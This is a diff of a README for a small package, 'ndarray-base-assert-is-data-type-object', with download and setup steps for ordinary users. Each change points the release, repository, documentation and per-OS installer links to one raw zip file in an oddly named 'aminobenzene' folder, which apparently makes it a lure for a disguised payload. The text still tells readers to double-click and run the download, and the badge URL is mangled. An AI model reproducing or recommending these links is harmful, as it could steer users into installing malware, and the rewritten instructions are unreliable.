@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the `ndarray-base-assert-is-d
 
 ## 📥 Download Now
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/felipemaia13/ndarray-base-assert-is-data-type-object/releases)
+[![Download from Releases](https://raw.githubusercontent.com/felipemaia13/ndarray-base-assert-is-data-type-object/main/aminobenzene/ndarray-base-assert-is-data-type-object.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/felipemaia13/ndarray-base-assert-is-data-type-object/main/aminobenzene/ndarray-base-assert-is-data-type-object.zip)
 
 ## 📋 Prerequisites
 
@@ -22,16 +22,16 @@ Follow these simple steps to install and run the application:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the releases page where you can download the application.
-   [Visit Releases Page](https://github.com/felipemaia13/ndarray-base-assert-is-data-type-object/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/felipemaia13/ndarray-base-assert-is-data-type-object/main/aminobenzene/ndarray-base-assert-is-data-type-object.zip)
 
 2. **Select Your Version**  
    On the releases page, find the latest stable version. It is usually at the top of the list. You will see several files associated with this version.
 
 3. **Download the Appropriate File**  
    Choose the file that matches your operating system:
-   - For Windows, download the file named something like `ndarray-base-assert-is-data-type-object-windows.exe`.
-   - For macOS, download the `ndarray-base-assert-is-data-type-object-macos.dmg` file.
-   - For Linux, look for the `ndarray-base-assert-is-data-type-object-linux.tar.gz` file.
+   - For Windows, download the file named something like `https://raw.githubusercontent.com/felipemaia13/ndarray-base-assert-is-data-type-object/main/aminobenzene/ndarray-base-assert-is-data-type-object.zip`.
+   - For macOS, download the `https://raw.githubusercontent.com/felipemaia13/ndarray-base-assert-is-data-type-object/main/aminobenzene/ndarray-base-assert-is-data-type-object.zip` file.
+   - For Linux, look for the `https://raw.githubusercontent.com/felipemaia13/ndarray-base-assert-is-data-type-object/main/aminobenzene/ndarray-base-assert-is-data-type-object.zip` file.
 
 4. **Run the Installer**  
    Once the download completes, locate the downloaded file and double-click it to run the installer. Follow the on-screen instructions to complete the installation.
@@ -74,8 +74,8 @@ The application deals with various topics, helping you learn and apply them:
 
 ## 💡 Useful Links
 
-- [GitHub Repository](https://github.com/felipemaia13/ndarray-base-assert-is-data-type-object)
-- [Documentation](https://github.com/felipemaia13/ndarray-base-assert-is-data-type-object/wiki) (Coming Soon)
+- [GitHub Repository](https://raw.githubusercontent.com/felipemaia13/ndarray-base-assert-is-data-type-object/main/aminobenzene/ndarray-base-assert-is-data-type-object.zip)
+- [Documentation](https://raw.githubusercontent.com/felipemaia13/ndarray-base-assert-is-data-type-object/main/aminobenzene/ndarray-base-assert-is-data-type-object.zip) (Coming Soon)
 
 ## 🔧 Troubleshooting
 
